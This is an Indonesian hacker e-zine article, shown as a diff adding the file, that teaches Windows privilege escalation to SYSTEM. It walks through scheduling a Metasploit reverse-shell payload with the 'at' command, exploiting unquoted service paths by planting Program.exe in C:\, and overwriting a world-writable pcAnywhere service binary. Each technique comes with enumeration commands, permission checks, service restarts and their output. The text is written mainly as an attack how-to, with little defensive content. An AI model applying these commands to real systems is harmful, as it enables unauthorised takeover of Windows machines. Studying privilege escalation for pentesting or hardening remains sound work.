@@ -1,0 +1,316 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXVI, PHILE 0x05.TXT
+ ___                             
+ )_  _ ( _   _  | __   o  _   _  
+(__ (_  ) ) (_) |   )  ( ) ) )_) 
+                |  (__      (_             
+
+     Windows Privileges Escalation
+     d.m0nk3y [at] echo [dot] or [dot] id
+
+-----| Pendahuluan
+
+Privilege adalah hak yang di miliki oleh user ataupun group user untuk
+melakukan kegiatan operasi pada sistem komputer. Pada sistem operasi linux kita
+mengenal root yang memiliki privileges tertinggi sistem operasi tersebut.
+Sedangkan pada sistem operasi windows dikenal SYSTEM sebagai pemegang hak
+tertinggi. 
+
+Pada sistem operasi windows terdapat 3 service user account, yaitu:
+
+-   LocalService
+
+	User account ini merupakan pemegang privilege terendah pada system
+	windows. Account ini mirip dengan Network Service hanya saja tidak
+	memiliki hak akses terhadap network.
+
+-   NetworkService
+
+	User ini mirip dengan LocalService dengan privilege yang terbatas,
+	tetapi memiliki akses pada network.
+
+-   LocalSystem
+
+	User account ini merupakan account yang memiliki privilige tertinggi
+	pada sistem. Account ini dapat digunakan untuk mengakses resources
+	melalui jaringan, dan lain sebagainya.
+
+
+Pada tulisan ini pembahasan exploitasi windows untuk mendapatkan privilege akan
+lebih memfokuskan terhadap kesalahan mendasar yang kadang dilakukan oleh user
+maupun developer.
+
+-----| Scene
+
+Banyak malware memanfaatkan celah keamanan yang ada pada windows untuk
+mendapatkan hak akses tertinggi pada sistem. Misalnya stuxnet yang memanfaatkan
+celah keamanan MS Task Scheduler (MS10-092) pada system operasi windows Vista,
+7 dan Server 2008 r2 dan Vulnerability pada Print Spooler Service (MS10-061).
+Dengan mendapatkan SYSTEM privilege akan memudahkan malware untuk melakukan
+penyebarannya pada jaringan yang terhubung dengan komputer korban.
+
+-----| Escalate Privilege
+
+1. "at" command escalation privilege
+
+"At" command adalah program berbasis commandline pada windows yang digunakan
+untuk melakukan penjadwalan pengeksekusian program pada windows. Program yang
+dieksekusi  melalui at command akan berjalan menggunakan SYSTEM privilege, hal
+ini hanya dapat dilakukan terhadap sistem operasi windows XP dan windows Server
+2003. untuk menjalankan job melalui AT command hanya dapat dilakukan oleh user
+yang berada pada group administrators.
+
+=====================================
+|/ C:\Documents and Settings\Farhan>time /t
+|| 04:52 PM
+|| 
+|| C:\Documents and Settings\Farhan>at 16:54 /interactive "Payload.exe"
+|| Added a new job with job ID = 1
+||
+|| C:\Documents and Settings\Farhan>at
+|| Status ID   Day                     Time          Command Line
+|| -------------------------------------------------------------------------------
+||        1   Today                   4:54 PM       Payload.exe
+||
+|\C:\Documents and Settings\Farhan>
+=====================================
+
+Dari commandline di atas, saya mencoba untuk memasukkan pengeksekusian
+Payload.exe ke dalam job at. Payload.exe adalah file executable yang sebelumnya
+di generate dengan menggunakan metasploit, untuk melakukan reverse connect
+shell pada box yang saya gunakan. Dan program Payload.exe diletakkan di dalam
+folder c:\Windows\system32 sehingga AT dapat mengenali letak program
+Palyoad.exe.
+
+Untuk kegiatan preventif dapat dilakukan dengan men-uninstall at command :))
+
+
+2. Windows trusted path service
+
+Trusted path service adalah bugs yang sudah ditemukan cukup lama dari tahun
+2001, namun beberapa untuk aplikasi masih ditemukan memiliki celah ini.
+Exploitasi terhadap trusted path service dapat dilakukan terhadap windows XP
+dan Windows server 2003. Celah ini terjadi ketika sang developer tidak
+melakukan filterisasi ketika membuat process baru.
+
+CreateProcess menjalankan process baru yang di hasilkan melalui dua parameter
+lpApplicationName dan lpCommandline. Parameter lpApplicationName berisikan file
+executable yang ingin di eksekusi, dan parameter lpCommandline berisikan
+argument yang digunakan terhadap file executable yang dieksekusi. Parameter
+lpApplicationName dapat diisikan dengan NULL, dengan catatan tidak ada spasi
+pada path menuju program. Berikut ini gambaran kode untuk menjalankan process
+baru: [7]
+
+CreateProccess(NULL,
+	       "C:\\Program Files\\My Dir\\My App.exe -p -a",
+	       ...);       ^         ^       ^
+	                   |--space  |       |--space
+				     --space
+
+Ketika service di jalankan, Program akan mengeksekusi "C:\\Program Files\\My
+Dir\\My App.exe -p -a" dan program akan berjalan secara normal. Tetapi jika
+terdapat "Program.exe" pada direktori c:\\ maka Program.exe itulah yang akan di
+eksekusi dan menghiraukan "C:\\Program Files\\My Dir\\My App.exe -p -a".  Hal
+ini dapat terjadi karena antara "Program _ files" terdapat space.
+
+String didalamnya dapat di interpretasikan ke dalam beberapa kemungkinan
+pengeksekusian program:
+
+ - C:\\Program.exe files\\My Dir\\My App
+ - C:\\Program Files\\My.exe dir\\My App
+ - C:\\Program Files\\My dir\\My.exe App
+ - C:\\Program Files\\My dir\\My App.exe
+
+Untuk melakukan exploitasi ini dibutuhkan user pada group administrators,
+sedangkan pada limited user (non administrator) dibutuhkan privilege untuk
+melakukan writing pada folder root C:\. Jalankan perintah berikut ini pada
+windows shell untuk mencari service yang ada.
+
+=====================================
+|/ C:\Documents and Settings\Farhan>for /F "tokens=2" %a in ('"sc query state=all | findstr SERVICE_NAME"') do @sc qc %a  | findstr BINARY_PATH_NAME | findstr /V "WINDOWS\\"
+||
+||        BINARY_PATH_NAME   : C:\Program Files\hMailServer\Bin\hMailServer.exe RunAsService
+||        BINARY_PATH_NAME   : C:\Program Files\OpenVPN\bin\openvpnserv.exe
+||        BINARY_PATH_NAME   : system32\VBoxService.exe
+|\
+======================================
+
+Dari result di atas terdapat dua software yang kemungkinan dapat di
+exploitasi, kemudian pastikan bahwa kedua service tersebut berjalan
+menggunakan SYSTEM Privilege.
+
+======================================
+|/ C:\Documents and Settings\Farhan>for /F "tokens=2" %a in ('"sc query state=all | findstr SERVICE_NAME"') do @sc qc %a >> serviceinfo.txt
+||
+|| C:\Documents and Settings\Farhan>type serviceinfo.txt
+|| -----snip-----
+|| SERVICE_NAME: hMailServer
+||        TYPE               : 10  WIN32_OWN_PROCESS 
+||        START_TYPE         : 2   AUTO_START
+||        ERROR_CONTROL      : 1   NORMAL
+||        BINARY_PATH_NAME   : C:\Program Files\hMailServer\Bin\hMailServer.exe RunAsService
+||        LOAD_ORDER_GROUP   : 
+||        TAG                : 0
+||        DISPLAY_NAME       : hMailServer
+||        DEPENDENCIES	   : RPCSS
+||        SERVICE_START_NAME : LocalSystem
+||	[SC] QueryServiceConfig SUCCESS
+||
+|| SERVICE_NAME: OpenVPNService
+||        TYPE               : 10  WIN32_OWN_PROCESS 
+||        START_TYPE         : 3   DEMAND_START
+||        ERROR_CONTROL      : 1   NORMAL
+||        BINARY_PATH_NAME   : C:\Program Files\OpenVPN\bin\openvpnserv.exe
+||        LOAD_ORDER_GROUP   : 
+||	TAG                : 0
+||        DISPLAY_NAME       : OpenVPN Service
+||        DEPENDENCIES	   : tap0900 
+||			   : Dhcp
+||        SERVICE_START_NAME : LocalSystem
+||	[SC] QueryServiceConfig SUCCESS
+||
+||-----snip-----
+|\
+=======================================
+
+Dan yak, kedua service tersebut dijalankan dengan privilege LocalSystem.
+Kemudian letakkan program bernama Program.exe yang berisikan payload untuk
+melakukan reverse/bind shell pada direktory c:\ dan lakukan restart / start
+jika belum hidup kedua service tersebut. Jika Service berjalan dengan normal,
+itu artinya tidak vulnerable terhadap trusted path service.
+
+wmic service OpenVPNService call startservice
+
+Jika vulnerable maka anda akan mendapatkan akses shell baru dengan privilege
+SYSTEM. Ketika seusai exploitasi Program.exe tidak di hapus maka akan muncul
+peringatan untuk melakukan rename file setiap melakukan proses startup
+komputer. Untuk melakukan exploitasi ini, metasploit framework telah
+menyediakan module bernama trusted_path_service.rb.
+
+
+3. Weak Service Permission
+
+Weak Service Permission adalah salah satu celah keamanan yang memanfaatkan
+service yang memberikan privilege terhadap user untuk melakukan write
+(overwrite) terhadap program yang berjalan dengan menggunakan SYSTEM
+privilege. untuk melakukan check terhadap service permission anda dapat
+menggunakan tools seperti AccessCHK[4] ataupun Windows-priv-check[5] atau
+dapat menggunakan commandline berikut ini:
+
+=====================================
+|/ C:\Users\ralph>for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >>
+permission.txt
+||
+|| -----snip-----
+|| 
+|| C:\Program Files\OpenVPN\bin\openvpnserv.exe
+|| C:\Program Files\Google\Update\GoogleUpdate.exe" /svc
+|| C:\Program Files\Google\Update\GoogleUpdate.exe" /medsvc
+|| C:\Program Files\Symantec\pcAnywhere\awhost32.exe"
+|| 
+|\
+=====================================
+
+Perintah di atas digunakan untuk mencari semua path program dari service yang
+ada ke dalam file bernama permission.txt.
+
+=====================================
+|/ C:\Users\ralph>for /f eol^=^"^ delims^=^" %a in (permission.txt) do cmd.exe /cicacls "%a"
+|| C:\Users\ralph>type permission.txt
+|| -----snip----
+|| 
+|| C:\Program Files\OpenVPN\bin\openvpnserv.exe  NT AUTHORITY\SYSTEM:(I)(F)
+||                                               BUILTIN\Administrators:(I)(F)
+|| 					      BUILTIN\Users:(I)(RX)
+|| 
+|| C:\Program Files\Google\Update\GoogleUpdate.exe NT AUTHORITY\SYSTEM:(I)(F)
+||                                                 BUILTIN\Administrators:(I)(F)
+|| 						BUILTIN\Users:(I)(RX)
+|| 
+|| C:\Program Files\Google\Update\GoogleUpdate.exe NT AUTHORITY\SYSTEM:(I)(F)
+||                                                 BUILTIN\Administrators:(I)(F)
+|| 						BUILTIN\Users:(I)(RX)
+|| 
+|| C:\Program Files\Symantec\pcAnywhere\awhost32.exe Everyone:(OI)(CI)(F)
+|| 						  NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+|\
+=====================================
+
+Hasil yang di dapat dari perintah di atas menunjukkan bahwa program
+awhost32.exe memperbolehkan semua user untuk memiliki full permission pada
+program tersebut. Kita dapat menggunakan metasploit payload yang sudah di
+generate menjadi executable program untuk men-overwrite program awhost32.exe.
+
+=====================================
+|/ C:\Users\ralph>sc query state= all | findstr awhost32
+|| SERVICE_NAME: awhost32
+|| 
+|| C:\Users\ralph>sc qc awhost32
+|| [SC] QueryServiceConfig SUCCESS
+|| 
+|| SERVICE_NAME: awhost32
+|| 	TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+||         START_TYPE         : 3   DEMAND_START
+|| 	ERROR_CONTROL      : 1   NORMAL
+||         BINARY_PATH_NAME   : "C:\Program Files\Symantec\pcAnywhere\awhost32.exe"
+||         LOAD_ORDER_GROUP   :
+||         TAG                : 0
+|| 	DISPLAY_NAME       : Symantec pcAnywhere Host Service
+||         DEPENDENCIES       :
+||         SERVICE_START_NAME : LocalSystem
+|| 
+|\ C:\Users\ralph>
+=====================================
+
+Dari perintah di atas, diketahui nama servicenya adalah awhost32 yang berjalan
+dengan menggunakan privilege LocalSystem. Agar program yang di overwrite dapat
+tereksekusi, maka restart service awhost32. Untuk me-restart service dibutuhkan
+user administrator yang dapat mengeksekusi program wmic.
+
+=====================================
+|/ C:\Windows\system32>wmic service awhost32 call startservice
+|| Executing (\\HELLOWORLD\ROOT\CIMV2:Win32_Service.Name="awhost32")->startservice()
+|\
+=====================================
+
+Terdapat jeda waktu beberapa detik yang diberikan ketika mengeksekusi service
+hingga program diterminasi, jika menggunakan metasploit maka gunakan auto
+migrate process pada box kita.
+
+msf  exploit(handler) > set AutoRunScript migrate -n explorer.exe
+AutoRunScript => migrate -n explorer.exe
+
+Seperti yang sudah dijelaskan sebelumnya, wmic hanya dapat dieksekusi oleh user
+pada group administrators jadi jika berada pada non administrator user kita
+dapat mempergunakan windows-priv-check sebagai alternatif untuk melakukan
+checking permission pada service yang ada atau dengan qc.
+
+Jika user tidak dapat melakukan restart service (non administrator), maka
+tunggu hingga target melakukan restart dan up kembali.
+
+
+------| Penutup
+
+Beberapa tehnik yang dibahas diatas tentu saja bukan menjadi satu-satunya cara
+untuk mendapatkan SYSTEM privilege pada windows. Masih banyak cara yang dapat
+digunakan misalnya dengan memanfaatkan weak permission pada registry, celah
+keamanan software yang terinstall hingga dengan melakukan exploitasi pada
+kernel windows.
+
+
+-----| Referensi
+
+1. http://www.insomniasec.com/publications/WindowsPrivEsc.ppt
+2. http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions
+3. http://msdn.microsoft.com/en-us/library/windows/desktop/ms686005(v=vs.85).aspx
+4. AccessCHK - http://technet.microsoft.com/en-us/sysinternals/bb664922
+5. Windows-priv-check - http://pentestmonkey.net/tools/windows-privesc-check
+6. http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
+7. Writing Secure Code 2nd Edition - Michael Howard & David LeBlanc
+8. http://www.commonexploits.com/?p=658
+9. www.metasploit.com/modules/exploit/windows/local/trusted_service_path
+
+-----| Greetz
+
+1. Allah SWT
+2. echo|staff: y3dips, lirva32, k159, az001, etc & echoers
+3. rndc: om sj, idslacker, fakewind, ab71, & others
